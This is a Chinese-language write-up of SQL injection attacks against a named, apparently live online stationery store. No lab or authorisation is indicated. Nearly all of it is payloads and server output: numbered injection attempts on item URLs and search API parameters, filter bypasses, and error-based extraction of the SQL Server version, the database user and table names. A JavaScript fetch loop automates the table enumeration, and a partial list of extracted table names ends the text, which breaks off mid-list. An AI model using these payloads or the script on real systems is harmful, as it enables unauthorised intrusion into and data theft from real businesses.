---
title: SQL Injection Stationer Success
description: SQL Injection Stationer Success
last_update:
  date: "2025-08-31T08:00:00+08:00"
---

## 前言

- 目標: `https://xl-stationer.com.tw/item/182藍色筆桿20mm推進式工程筆0021`
- 可控制 item 後面的 path 達到 SQLi

## 測試流程

1. `https://xl-stationer.com.tw/item/'`

[Microsoft][ODBC SQL Server Driver][SQL Server]接近 '1' 之處的語法不正確。

```sql
select I.partName,I.Id,I.Name as ItemName,C.Id as ClsId,C.Name as ClsName,CU.Id as ClsUpId,CU.Name as ClsUpName,O.Id as RoomId,O.Name as RoomName,I.ItemColorId,I.MinAmount,I.multipleLimit from Item I Left join Cls C on I.ClsId=C.Id Left join ClsUp CU on C.ClsUpId=CU.Id Left join OnlineRoom O on CU.OnlineRoomId=O.Id WHERE Replace(Replace(Replace(Replace(Replace(I.Name,' ',''),'.',''),'\',''),'/',''),'#','')=''' and I.online=1 and I.State in ('1','2')
```

2. `'%20AND%201%20=%20CONVERT(int,@@version)--`

[Microsoft][ODBC SQL Server Driver][SQL Server]接近 'AND1' 之處的語法不正確。

```sql
select I.partName,I.Id,I.Name as ItemName,C.Id as ClsId,C.Name as ClsName,CU.Id as ClsUpId,CU.Name as ClsUpName,O.Id as RoomId,O.Name as RoomName,I.ItemColorId,I.MinAmount,I.multipleLimit from Item I Left join Cls C on I.ClsId=C.Id Left join ClsUp CU on C.ClsUpId=CU.Id Left join OnlineRoom O on CU.OnlineRoomId=O.Id WHERE Replace(Replace(Replace(Replace(Replace(I.Name,' ',''),'.',''),'\',''),'/',''),'#','')=''AND1=CONVERT(int,@@version)--' and I.online=1 and I.State in ('1','2')
```

看起來 `%20` 沒有被轉成空白(?)

3. `'%20OR%20'1'%20=%20'1`

有成功顯示第一筆商品的資料，所以空白應該是可以的(?)

4. `'%20OR%20'1'%20=%20CONVERT(int,@@version)%20AND%20'1'%20=%20'1`

[Microsoft][ODBC SQL Server Driver][SQL Server]將 nvarchar 值 'Microsoft SQL Server 2012 (SP4) (KB4018073) - 11.0.7001.0 (X64) Aug 15 2017 10:23:29 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows NT 6.3 (Build 17763: ) (Hypervisor) ' 轉換成資料類型 int 時，轉換失敗。

```sql
select I.partName,I.Id,I.Name as ItemName,C.Id as ClsId,C.Name as ClsName,CU.Id as ClsUpId,CU.Name as ClsUpName,O.Id as RoomId,O.Name as RoomName,I.ItemColorId,I.MinAmount,I.multipleLimit from Item I Left join Cls C on I.ClsId=C.Id Left join ClsUp CU on C.ClsUpId=CU.Id Left join OnlineRoom O on CU.OnlineRoomId=O.Id WHERE Replace(Replace(Replace(Replace(Replace(I.Name,' ',''),'.',''),'\',''),'/',''),'#','')=''OR'1'=CONVERT(int,@@version)AND'1'='1' and I.online=1 and I.State in ('1','2')
```

看起來 `%20` 沒有被轉成空白，所以改用 `'OR'1'=CONVERT(int,@@version)AND'1'='1` 的方式，就不需要空白了

5. `'%20OR%20'1'%20=%20CONVERT(int,(SELECT%20table_name%20FROM%20information_schema.tables%20FOR%20XML%20PATH('')))%20AND%20'1'%20=%20'1`

404 頁面，我忘記空白符號會被切掉了

6. `'OR'1'%3DCONVERT(int%2C(SELECT%09table_name%09FROM%09information_schema.tables%09FOR%09XML%09PATH('')))AND'1'%3D'1`

```
Bad Request - Invalid URL
HTTP Error 400. The request URL is invalid.
```

7. `'OR'1'=CONVERT(int,(SELECT+table_name+FROM+information_schema.tables+FOR+XML+PATH('')))AND'1'='1`

404 頁面

8. `'OR'1'%3DCONVERT(int%2C(SELECT(table_name)FROM(information_schema.tables)FOR(XML)PATH('')))AND'1'%3D'1`

404 頁面

9. `'UNION(SELECT'a','b')--`

[Microsoft][ODBC SQL Server Driver][SQL Server]使用 UNION、INTERSECT 或 EXCEPT 運算子結合的所有查詢，其目標清單中的運算式數量必須相等。

```sql
select I.partName,I.Id,I.Name as ItemName,C.Id as ClsId,C.Name as ClsName,CU.Id as ClsUpId,CU.Name as ClsUpName,O.Id as RoomId,O.Name as RoomName,I.ItemColorId,I.MinAmount,I.multipleLimit from Item I Left join Cls C on I.ClsId=C.Id Left join ClsUp CU on C.ClsUpId=CU.Id Left join OnlineRoom O on CU.OnlineRoomId=O.Id WHERE Replace(Replace(Replace(Replace(Replace(I.Name,' ',''),'.',''),'\',''),'/',''),'#','')=''UNION(SELECT'a','b')--' and I.online=1 and I.State in ('1','2')
```

10. `'UNION(SELECT(NULL),(NULL),(NULL),(NULL),(NULL),(NULL),(NULL),(NULL),(NULL),(NULL),(NULL),(NULL))--`

```html
<font face="Arial" size="2"> <p>Microsoft VBScript 執行階段錯誤</p></font>
<font face="Arial" size="2">錯誤 '800a0009'</font>
<p>
  <font face="Arial" size="2">陣列索引超出範圍: '[number: 0]'</font>
</p>

<p>
  <font face="Arial" size="2">/Details.asp</font
  ><font face="Arial" size="2">, 行49</font>
</p>
```

看來應該是 12 個欄位，我們來觀察一下欄位的型別

```sql
select
I.partName, -- 字串
I.Id, -- 整數
I.Name as ItemName, -- 字串
C.Id as ClsId, -- 整數
C.Name as ClsName, -- 字串
CU.Id as ClsUpId, -- 整數
CU.Name as ClsUpName, -- 字串
O.Id as RoomId, -- 整數
O.Name as RoomName, -- 字串
I.ItemColorId, -- 整數
I.MinAmount, -- 整數
I.multipleLimit -- 整數
```

11. `'UNION(SELECT(1),(1),(1),(1),(1),(1),(1),(1),(1),(1),(1),(1))--`

[Microsoft][ODBC SQL Server Driver][SQL Server]將 nvarchar 值 '手工裝飾素材' 轉換成資料類型 int 時，轉換失敗。

```sql
select I.partName,I.Id,I.Name as ItemName,C.Id as ClsId,C.Name as ClsName,CU.Id as ClsUpId,CU.Name as ClsUpName,O.Id as RoomId,O.Name as RoomName,I.ItemColorId,I.MinAmount,I.multipleLimit from Item I Left join Cls C on I.ClsId=C.Id Left join ClsUp CU on C.ClsUpId=CU.Id Left join OnlineRoom O on CU.OnlineRoomId=O.Id WHERE Replace(Replace(Replace(Replace(Replace(I.Name,' ',''),'.',''),'\',''),'/',''),'#','')=''UNION(SELECT(1),(1),(1),(1),(1),(1),(1),(1),(1),(1),(1),(1))--' and I.online=1 and I.State in ('1','2')
```

12. `https://xl-stationer.com.tw/item/'UNION(SELECT'hello1',(1),'hello3',(1),'hello5',(1),(1),(1),(1),(1),(1),(1))--`

[Microsoft][ODBC SQL Server Driver][SQL Server]將 nvarchar 值 '手工藝品' 轉換成資料類型 int 時，轉換失敗。

```sql
select I.partName,I.Id,I.Name as ItemName,C.Id as ClsId,C.Name as ClsName,CU.Id as ClsUpId,CU.Name as ClsUpName,O.Id as RoomId,O.Name as RoomName,I.ItemColorId,I.MinAmount,I.multipleLimit from Item I Left join Cls C on I.ClsId=C.Id Left join ClsUp CU on C.ClsUpId=CU.Id Left join OnlineRoom O on CU.OnlineRoomId=O.Id WHERE Replace(Replace(Replace(Replace(Replace(I.Name,' ',''),'.',''),'\',''),'/',''),'#','')=''UNION(SELECT'hello1',(1),'hello3',(1),'hello5',(1),(1),(1),(1),(1),(1),(1))--' and I.online=1 and I.State in ('1','2')
```

13. `https://xl-stationer.com.tw/item/'UNION(SELECT'hello1',(1),'hello3',(1),'hello5',(1),'hello7',(1),'hello9',(1),(1),(1))--`

```html
<font face="Arial" size="2"> <p>Microsoft VBScript 執行階段錯誤</p></font>
<font face="Arial" size="2">錯誤 '800a0009'</font>
<p>
  <font face="Arial" size="2">陣列索引超出範圍: '[number: 0]'</font>
</p>

<p>
  <font face="Arial" size="2">/Details.asp</font
  ><font face="Arial" size="2">, 行49</font>
</p>
```

看來應該是第 9 個欄位的型別比較特別(?)但前面用 `WHERE Replace(Replace(Replace(Replace(Replace(I.Name,' ',''),'.',''),'\',''),'/',''),'#','')=''` 竟然有查到資料，那我們先改成一個查不到資料的試試看

14. `123'UNION(SELECT'hello1',(1),'hello3',(1),'hello5',(1),'hello7',(1),'hello9',(1),(1),(1))--`

看到一個空白的商品頁，稍微調整一下注入的數字跟字串

15. `123'UNION(SELECT'hello1',(287),'hello3',(487),'hello5',(687),'hello7',(887),'hello9',(1087),(1187),(1287))--`

透過 F12 > Network > Doc 搜尋我們的字串

- 2 => `onclick="window.location.href='/item/文具(287)'"`
- 3,5,7 => `<meta name="keywords" content="hello3 / hello5 / hello7 /..."/>`
- 11 => `<li>訂購金額需滿<span style="color:red;">1187</span>元才可下單。。</li>`
- 12 => 訂購數量需為12的倍數。

16. `123'UNION(SELECT'hello1',(287),table_name,(487),'hello5',(687),'hello7',(887),'hello9',(1087),(1187),(1287))from(information_schema.tables)--`

404

17. `123.123`

看來應該是 `.` 在作怪，所以 `information_schema.tables` 才會失效

18.

```sql
123'UNION(SELECT'hello1',(287),table_name,(487),'hello5',(687),'hello7',(887),'hello9',(1087),(1187),(1287))from(information_schema'+CHAR(46)+'tables)--
123'UNION(SELECT'hello1',(287),table_name,(487),'hello5',(687),'hello7',(887),'hello9',(1087),(1187),(1287))from(information_schema.tables)--
%31%32%33%27%55%4E%49%4F%4E%28%53%45%4C%45%43%54%27%68%65%6C%6C%6F%31%27%2C%28%32%38%37%29%2C%74%61%62%6C%65%5F%6E%61%6D%65%2C%28%34%38%37%29%2C%27%68%65%6C%6C%6F%35%27%2C%28%36%38%37%29%2C%27%68%65%6C%6C%6F%37%27%2C%28%38%38%37%29%2C%27%68%65%6C%6C%6F%39%27%2C%28%31%30%38%37%29%2C%28%31%31%38%37%29%2C%28%31%32%38%37%29%29%66%72%6F%6D%28%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%29%2D%2D
```

404

```
要求的 URL	   123'UNION(SELECT'hello1',(287),table_name,(487),'hello5',(687),'hello7',(887),'hello9',(1087),(1187),(1287))from(information_schema.tables)--
實體路徑	   123'UNION(SELECT'hello1',(287),table_name,(487),'hello5',(687),'hello7',(887),'hello9',(1087),(1187),(1287))from(information_schema.tables)--
```

19. `123'UNION(SELECT'hello1',(287),table_name,(487),'hello5',(687),'hello7',(887),'hello9',(1087),(1187),(1287))FROM(sysobjects)WHERE(xtype)=('U')--`

Microsoft][ODBC SQL Server Driver][SQL Server]接近關鍵字 'FROM' 之處的語法不正確。

```sql
select I.partName,I.Id,I.Name as ItemName,C.Id as ClsId,C.Name as ClsName,CU.Id as ClsUpId,CU.Name as ClsUpName,O.Id as RoomId,O.Name as RoomName,I.ItemColorId,I.MinAmount,I.multipleLimit from Item I Left join Cls C on I.ClsId=C.Id Left join ClsUp CU on C.ClsUpId=CU.Id Left join OnlineRoom O on CU.OnlineRoomId=O.Id WHERE Replace(Replace(Replace(Replace(Replace(I.Name,' ',''),'.',''),'\',''),'/',''),'#','')='123'UNION(SELECT'hello1',(287),table_name,(487),'hello5',(687),'hello7',(887),'hello9',(1087),(1187),(1287))FROM(sysobjects)WHERE(xtype)=('U')--' and I.online=1 and I.State in ('1','2')
```

20. `123'UNION(SELECT'hello1',(287),table_name,(487),'hello5',(687),'hello7',(887),'hello9',(1087),(1187),(1287)FROM(sysobjects)WHERE(xtype)=('U'))--`

[Microsoft][ODBC SQL Server Driver][SQL Server]接近 ')' 之處的語法不正確。

```sql
select I.partName,I.Id,I.Name as ItemName,C.Id as ClsId,C.Name as ClsName,CU.Id as ClsUpId,CU.Name as ClsUpName,O.Id as RoomId,O.Name as RoomName,I.ItemColorId,I.MinAmount,I.multipleLimit from Item I Left join Cls C on I.ClsId=C.Id Left join ClsUp CU on C.ClsUpId=CU.Id Left join OnlineRoom O on CU.OnlineRoomId=O.Id WHERE Replace(Replace(Replace(Replace(Replace(I.Name,' ',''),'.',''),'\',''),'/',''),'#','')='123'UNION(SELECT'hello1',(287),table_name,(487),'hello5',(687),'hello7',(887),'hello9',(1087),(1187),(1287)FROM(sysobjects)WHERE(xtype)=('U'))--' and I.online=1 and I.State in ('1','2')
```

21. `123'UNION(SELECT'hello1',(287),(SELECT(name)FROM(sysobjects)WHERE(xtype)='U'),(487),'hello5',(687),'hello7',(887),'hello9',(1087),(1187),(1287))--`

[Microsoft][ODBC SQL Server Driver][SQL Server]接近 ')' 之處的語法不正確。

```sql
select I.partName,I.Id,I.Name as ItemName,C.Id as ClsId,C.Name as ClsName,CU.Id as ClsUpId,CU.Name as ClsUpName,O.Id as RoomId,O.Name as RoomName,I.ItemColorId,I.MinAmount,I.multipleLimit from Item I Left join Cls C on I.ClsId=C.Id Left join ClsUp CU on C.ClsUpId=CU.Id Left join OnlineRoom O on CU.OnlineRoomId=O.Id WHERE Replace(Replace(Replace(Replace(Replace(I.Name,' ',''),'.',''),'\',''),'/',''),'#','')='123'UNION(SELECT'hello1',(287),(SELECT(name)FROM(sysobjects)WHERE(xtype)='U'),(487),'hello5',(687),'hello7',(887),'hello9',(1087),(1187),(1287))--' and I.online=1 and I.State in ('1','2')
```

22. `'AND(SELECT(COUNT(*))FROM(Users))>0--`

[Microsoft][ODBC SQL Server Driver][SQL Server]接近 ')' 之處的語法不正確。

```sql
select I.partName,I.Id,I.Name as ItemName,C.Id as ClsId,C.Name as ClsName,CU.Id as ClsUpId,CU.Name as ClsUpName,O.Id as RoomId,O.Name as RoomName,I.ItemColorId,I.MinAmount,I.multipleLimit from Item I Left join Cls C on I.ClsId=C.Id Left join ClsUp CU on C.ClsUpId=CU.Id Left join OnlineRoom O on CU.OnlineRoomId=O.Id WHERE Replace(Replace(Replace(Replace(Replace(I.Name,' ',''),'.',''),'\',''),'/',''),'#','')=''AND(SELECT(COUNT(*))FROM(Users))>0--' and I.online=1 and I.State in ('1','2')
```

空白, `.`, `%2F**%2F` 都不能注入，雖然有 SQLi，但能偷到的資料不多

## 前言2

- 目標: `https://xl-stationer.com.tw/_Models/mItemList.asp?ClsId=1&ClsUpId=&Name=123123&PriceMax=&PriceMin=0&RoomId=&orderby=2&page=1&sty=`
- 可控制每個參數
- 這個 API 回傳的是 JSON 列表，有機會達成 UNION SELECT

## 測試流程2

1. `mItemList.asp?Name=%27&PriceMin=0&orderby=2&page=1`

```
[Microsoft][ODBC SQL Server Driver][SQL Server]遺漏字元字串 '') as OutputStr' 後面的引號。<hr>select dbo.GetKeywordsList(''') as OutputStr
```

2. `mItemList.asp?Name=123123123%27)%20UNION%20SELECT%20NULL--&PriceMin=0&orderby=2&page=1`

```
[Microsoft][ODBC SQL Server Driver][SQL Server]接近關鍵字 'UNION' 之處的語法不正確。<hr>select dbo.GetKeywordsList('123123123'  UNION SELECT NULL--') as OutputStr
```

3. `mItemList.asp?ClsId=&ClsUpId=456456%27&Name=123123&PriceMax=&PriceMin=0&RoomId=&orderby=2&page=1&sty`

```
[Microsoft][ODBC SQL Server Driver][SQL Server]接近 ',') like ' 之處的語法不正確。<hr>exec ssp_search_page 'SELECT top 100 percent t.OrderId,t.ScdId,t.PrvId,t.OnlineRoomId,t.ClsUpId,t.ClsId,t.ROWID,t.Id,t.Name,t.urlName,t.ImgFile,t.ClsName,t.SizeName,t.SpcPrice,t.AdvPrice,t.Qty,t.IconTopPic,t.IconTitle,  ROUND((Case I.swDicPrice WHEN 1 THEN I.Price ELSE ( Case  WHEN I.PriceF <= 15 THEN  CEILING((dbo.GetOnlinePrvdDiscount(I.PrvdId)) * I.PriceF) ELSE ((dbo.GetOnlinePrvdDiscount(I.PrvdId)) * I.PriceF) END )  END ) ,0) As MemberPrice, ROUND( I.PriceF , 0) As FixedPrice,  ROUND( I.Price , 0) As SalePrice,  ROUND(I.Price,0) As GroupPrice,  ROW_NUMBER() OVER (ORDER BY ROWID) as _RowId from TmpProductItem as t with(nolock) , item as i   where i.id=T.id   and t.ClsUpId=''456456''''  AND ((Replace(t.Name+isnull(t.Keywords,''''),'' '','''') like ''%123123%'')                              or t.Id=''123123'' OR t.ScdID=''123123'' OR t.PrvId=''123123'' ) ORDER BY ISNull(t.Qty, 0) DESC, t.Id ','1','20'
```

4. `mItemList.asp?ClsId=&ClsUpId=456456%27--&Name=123123&PriceMax=&PriceMin=0&RoomId=&orderby=2&page=1&sty`

```json
{
  "rs": [],
  "PageCount": 1,
  "RecCount": 0,
  "HTTP_ImageMainPath": "https:\/\/www.xl-stationer.com.tw\/P803_IMG\/_004\/",
  "PageSize": 20,
  "RoomId": "",
  "RoomName": null,
  "ClsUpId": "456456'--",
  "ClsUpName": null,
  "ClsId": "",
  "ClsName": null,
  "orderby": "2"
}
```

5. `mItemList.asp?ClsId=&ClsUpId=456456%27%20UNION%20SELECT%20NULL--&Name=123123&PriceMax=&PriceMin=0&RoomId=&orderby=2&page=1&sty=`

```
[Microsoft][ODBC SQL Server Driver][SQL Server]使用 UNION、INTERSECT 或 EXCEPT 運算子結合的所有查詢，其目標清單中的運算式數量必須相等。<hr>exec ssp_search_page 'SELECT top 100 percent t.OrderId,t.ScdId,t.PrvId,t.OnlineRoomId,t.ClsUpId,t.ClsId,t.ROWID,t.Id,t.Name,t.urlName,t.ImgFile,t.ClsName,t.SizeName,t.SpcPrice,t.AdvPrice,t.Qty,t.IconTopPic,t.IconTitle,  ROUND((Case I.swDicPrice WHEN 1 THEN I.Price ELSE ( Case  WHEN I.PriceF <= 15 THEN  CEILING((dbo.GetOnlinePrvdDiscount(I.PrvdId)) * I.PriceF) ELSE ((dbo.GetOnlinePrvdDiscount(I.PrvdId)) * I.PriceF) END )  END ) ,0) As MemberPrice, ROUND( I.PriceF , 0) As FixedPrice,  ROUND( I.Price , 0) As SalePrice,  ROUND(I.Price,0) As GroupPrice,  ROW_NUMBER() OVER (ORDER BY ROWID) as _RowId from TmpProductItem as t with(nolock) , item as i   where i.id=T.id   and t.ClsUpId=''456456''UNION SELECT NULL--''  AND ((Replace(t.Name+isnull(t.Keywords,''''),'' '','''') like ''%123123%'')                              or t.Id=''123123'' OR t.ScdID=''123123'' OR t.PrvId=''123123'' ) ORDER BY ISNull(t.Qty, 0) DESC, t.Id ','1','20'
```

UNION SELECT 有成功注入，直接數一下有幾個欄位

```sql
SELECT top 100 percent
t.OrderId, -- 整數
t.ScdId, -- 整數
t.PrvId, -- 整數
t.OnlineRoomId, -- 整數
t.ClsUpId, -- 整數
t.ClsId, -- 整數
t.ROWID, -- 整數
t.Id, -- 整數
t.Name, -- 字串
t.urlName, -- 字串
t.ImgFile, -- 字串
t.ClsName, -- 字串
t.SizeName, -- 字串
t.SpcPrice, -- 整數
t.AdvPrice, -- 整數
t.Qty, -- 整數
t.IconTopPic, -- 字串
t.IconTitle, -- 字串
ROUND((Case I.swDicPrice WHEN 1 THEN I.Price ELSE ( Case  WHEN I.PriceF <= 15 THEN  CEILING((dbo.GetOnlinePrvdDiscount(I.PrvdId)) * I.PriceF) ELSE ((dbo.GetOnlinePrvdDiscount(I.PrvdId)) * I.PriceF) END )  END ) ,0) As MemberPrice, -- 整數
ROUND( I.PriceF , 0) As FixedPrice, -- 整數
ROUND( I.Price , 0) As SalePrice, -- 整數
ROUND(I.Price,0) As GroupPrice, -- 整數
ROW_NUMBER() OVER (ORDER BY ROWID) as _RowId -- 整數
```

總共 23 個欄位

6. `mItemList.asp?ClsId=&ClsUpId=456456%27%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--&Name=123123&PriceMax=&PriceMin=0&RoomId=&orderby=2&page=1&sty=`

```
INSERT INTO OnlineSearchLog (KeyWord,OnlineRoomId,PriceMin,PriceMax,RecCount,Page,CreateTime,Creater,Log) VALUES ('123123','',0,0,1,1, GetDate(),'','ClsId=&ClsUpId=456456%27%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--&Name=123123&PriceMax=&PriceMin=0&RoomId=&orderby=2&page=1&sty=')<br>[Microsoft][ODBC SQL Server Driver][SQL Server]字串或二進位資料會被截斷。
```

巨煩，查詢資料還會 Append Log，看來是 Log 長度踩到上限。還好沒有記 IP，Creater 看起來是空字串

7. `mItemList.asp?ClsUpId=%27%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--&Name=qwe`

```
[Microsoft][ODBC SQL Server Driver][SQL Server]使用 UNION、INTERSECT 或 EXCEPT 運算子結合的所有查詢，其目標清單中的運算式數量必須相等。<hr>select b.Id as ClsUpId,b.Name as ClsUpName,c.ID as RoomId,c.Name as RoomName from ClsUp b left join OnlineRoom c on b.OnlineRoomId=c.ID where b.Id='' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'
```

我把一些查詢條件拿掉後，欄位突然變少了

```sql
select
b.Id as ClsUpId,
b.Name as ClsUpName,
c.ID as RoomId,
c.Name as RoomNam
```

8. `mItemList.asp?ClsUpId=%27%20UNION%20SELECT%20NULL,NULL,NULL,NULL--`

```
[Microsoft][ODBC SQL Server Driver][SQL Server]使用 UNION、INTERSECT 或 EXCEPT 運算子結合的所有查詢，其目標清單中的運算式數量必須相等。<hr>exec ssp_search_page 'SELECT top 100 percent t.OrderId,t.ScdId,t.PrvId,t.OnlineRoomId,t.ClsUpId,t.ClsId,t.ROWID,t.Id,t.Name,t.urlName,t.ImgFile,t.ClsName,t.SizeName,t.SpcPrice,t.AdvPrice,t.Qty,t.IconTopPic,t.IconTitle,  ROUND((Case I.swDicPrice WHEN 1 THEN I.Price ELSE ( Case  WHEN I.PriceF <= 15 THEN  CEILING((dbo.GetOnlinePrvdDiscount(I.PrvdId)) * I.PriceF) ELSE ((dbo.GetOnlinePrvdDiscount(I.PrvdId)) * I.PriceF) END )  END ) ,0) As MemberPrice, ROUND( I.PriceF , 0) As FixedPrice,  ROUND( I.Price , 0) As SalePrice,  ROUND(I.Price,0) As GroupPrice,  ROW_NUMBER() OVER (ORDER BY ROWID) as _RowId from TmpProductItem as t with(nolock) , item as i   where i.id=T.id   and t.ClsUpId='''' UNION SELECT NULL,NULL,NULL,NULL--'' ORDER BY ISNull(t.Qty, 0) DESC, Id ','1','20'網站忙碌中請稍後
```

啊，我知道了，這邊的 `ClsUpId` 應該是會添加到多個 SELECT 的 SQL 語法，所以沒辦法用 UNION 一次滿足

querystring 有的欄位

```
ClsId
ClsUpId
Name
PriceMax
PriceMin
RoomId
orderby
page
sty
```

9. `mItemList.asp?ClsId=%27%20UNION%20SELECT%20NULL--`

```
[Microsoft][ODBC SQL Server Driver][SQL Server]使用 UNION、INTERSECT 或 EXCEPT 運算子結合的所有查詢，其目標清單中的運算式數量必須相等。<hr>exec ssp_search_page 'SELECT top 100 percent t.OrderId,t.ScdId,t.PrvId,t.OnlineRoomId,t.ClsUpId,t.ClsId,t.ROWID,t.Id,t.Name,t.urlName,t.ImgFile,t.ClsName,t.SizeName,t.SpcPrice,t.AdvPrice,t.Qty,t.IconTopPic,t.IconTitle,  ROUND((Case I.swDicPrice WHEN 1 THEN I.Price ELSE ( Case  WHEN I.PriceF <= 15 THEN  CEILING((dbo.GetOnlinePrvdDiscount(I.PrvdId)) * I.PriceF) ELSE ((dbo.GetOnlinePrvdDiscount(I.PrvdId)) * I.PriceF) END )  END ) ,0) As MemberPrice, ROUND( I.PriceF , 0) As FixedPrice,  ROUND( I.Price , 0) As SalePrice,  ROUND(I.Price,0) As GroupPrice,  ROW_NUMBER() OVER (ORDER BY ROWID) as _RowId from TmpProductItem as t with(nolock) , item as i   where i.id=T.id   and t.ClsId = '''' UNION SELECT NULL--'' ORDER BY ISNull(t.Qty, 0) DESC, Id ','1','20'
```

10. `mItemList.asp?PriceMax=%27%20UNION%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--`

```html
<font face="Arial" size="2"> <p>Microsoft VBScript 執行階段錯誤</p></font>
<font face="Arial" size="2">錯誤 '800a000d'</font>
<p>
  <font face="Arial" size="2"
    >類型不符: '[string: &quot;' UNION SELECT NULL,&quot;]'</font
  >
</p>

<p>
  <font face="Arial" size="2">/_Models/mItemList.asp</font
  ><font face="Arial" size="2">, 行264</font>
</p>
```

看來 UNION SELECT 很麻煩，先改用 Error-Based 試試看

11.

`%27%20AND%201%20%3D%20CONVERT(int%2C%40%40version)--`
`%27%20AND%201%20>%20CONVERT(int%2C%40%40version)--`

```
[Microsoft][ODBC SQL Server Driver][SQL Server]接近關鍵字 'CONVERT' 之處的語法不正確。<hr>exec ssp_search_page 'SELECT top 100 percent t.OrderId,t.ScdId,t.PrvId,t.OnlineRoomId,t.ClsUpId,t.ClsId,t.ROWID,t.Id,t.Name,t.urlName,t.ImgFile,t.ClsName,t.SizeName,t.SpcPrice,t.AdvPrice,t.Qty,t.IconTopPic,t.IconTitle,  ROUND((Case I.swDicPrice WHEN 1 THEN I.Price ELSE ( Case  WHEN I.PriceF <= 15 THEN  CEILING((dbo.GetOnlinePrvdDiscount(I.PrvdId)) * I.PriceF) ELSE ((dbo.GetOnlinePrvdDiscount(I.PrvdId)) * I.PriceF) END )  END ) ,0) As MemberPrice, ROUND( I.PriceF , 0) As FixedPrice,  ROUND( I.Price , 0) As SalePrice,  ROUND(I.Price,0) As GroupPrice,  ROW_NUMBER() OVER (ORDER BY ROWID) as _RowId from TmpProductItem as t with(nolock) , item as i   where i.id=T.id   and t.ClsUpId='''' AND 1   CONVERT int,@@version --'' ORDER BY ISNull(t.Qty, 0) DESC, Id ','1','20'
```

看來 `=`, `(`, `)`, `>`, `<` 都會被過濾

12. `mItemList.asp?ClsUpId=%27;SELECT%201/@@version--`

```
Microsoft OLE DB Provider for ODBC Drivers 錯誤 '80004005'

[Microsoft][ODBC SQL Server Driver][SQL Server]將 nvarchar 值 'Microsoft SQL Server 2012 (SP4) (KB4018073) - 11.0.7001.0 (X64) Aug 15 2017 10:23:29 Copyright (c) Microsoft Corporation Standard Edition (64-bit) on Windows NT 6.3 <X64> (Build 17763: ) (Hypervisor) ' 轉換成資料類型 int 時，轉換失敗。

/_Models/mItemList.asp, 行352
```

成功提取到 `@@version`

13. `mItemList.asp?ClsUpId=%27;SELECT%201/USER--`

```
Microsoft OLE DB Provider for ODBC Drivers 錯誤 '80004005'

[Microsoft][ODBC SQL Server Driver][SQL Server]將 nvarchar 值 'dbo' 轉換成資料類型 int 時，轉換失敗。

/_Models/mItemList.asp, 行352
```

成功提取到 `USER`

14. `%27;SELECT%20TOP%201%20name%20FROM%20sysobjects%20WHERE%20xtype%20LIKE%20%27U%27--`

```
Microsoft OLE DB Provider for ODBC Drivers 錯誤 '80004005'

[Microsoft][ODBC SQL Server Driver][SQL Server]sp_cursorfetch: 所提供的資料指標識別碼的值 (0) 無效。

/include/Json_Util.asp, 行50
```

15. `ClsUpId=%27;SELECT%201/name%20FROM%20sysobjects%20WHERE%20xtype%20LIKE%20%27U%27--`

```
Microsoft OLE DB Provider for ODBC Drivers 錯誤 '80004005'

[Microsoft][ODBC SQL Server Driver][SQL Server]將 nvarchar 值 'CashDay' 轉換成資料類型 int 時，轉換失敗。

/_Models/mItemList.asp, 行352
```

成功提取到 `CashDay`

16. `%27;SELECT%201/name%20FROM%20sysobjects%20WHERE%20xtype%20LIKE%20%27U%27%20AND%20name%20NOT%20LIKE%20%27CashDay%27--`

```
Microsoft OLE DB Provider for ODBC Drivers 錯誤 '80004005'

[Microsoft][ODBC SQL Server Driver][SQL Server]將 nvarchar 值 'temp_OutPrvdInv_11302' 轉換成資料類型 int 時，轉換失敗。

/_Models/mItemList.asp, 行352
```

成功提取到 `temp_OutPrvdInv_11302`

17. `%27;SELECT%201/name%20FROM%20sysobjects%20WHERE%20xtype%20LIKE%20%27U%27%20AND%20name%20NOT%20LIKE%20%27CashDay%27%20AND%20name%20NOT%20LIKE%20%27temp_OutPrvdInv_11302%27--`

成功提取到 `tempAccPeremXL_20250710`

18. 提取 table_names

```js
const table_names = [];
const fixedUrl = `https://xl-stationer.com.tw/_Models/mItemList.asp?ClsUpId=';SELECT 1/name FROM sysobjects WHERE xtype LIKE 'U'`;
async function main() {
  for (let i = 0; i < 1; i++) {
    const andSyntax = table_names
      .map((table_name) => ` AND name NOT LIKE '${table_name}'`)
      .join("");
    const fullUrl = `${fixedUrl}${andSyntax}--`;
    const res = await fetch(fullUrl);
    const text = await res.text();
    const table_name = text.split("'")[1] === "80004005" && text.split("'")[3];
    if (table_name) table_names.push(table_name);
    else break;
  }
}
```

結果只提取到 40 幾個 table_name

```js
[
  "CashDay",
  "temp_OutPrvdInv_11302",
  "tempAccPeremXL_20250710",
  "PrvdChargeEasy",
  "OutChargeDetail",
  "PrvdAllowanceText",
  "HRLeaveSheet",
  "ItemStyle",
  "KeyworksBaseBook",
  "temp_OutPrvdInv_11303",
  "ItemPkgLevel",
  "AccDoc",
  "StockItemPrvd",
  "PrvdDiscount",
  "Shopee_P_03",
  "temp_OutPrvdInv_11304",
  "MnyType",
  "PrvdChargeEasyDetail",
  "ErrorMsg",
  "temp_cus_20240822",
  "AccPeremDelDetail",
  "tblEcLog",
  "temp_OutPrvdInv_11305",
  "SaleGoal",
  "CashPrint",
  "temp_item2_0001_20250804",
  "sp_PrivateVariables",
  "Income",
  "ValueAdd",
  "temp_PrvdAllowance_20240628",
  "QuotationDetail",
  "SalePrjAddDetail",
  "InStkAcc",
  "SubCls",
  "temp_InBank_20240801",
  "InChargeConfirm",
  "AccPeremDetail",
  "sendmaillog",
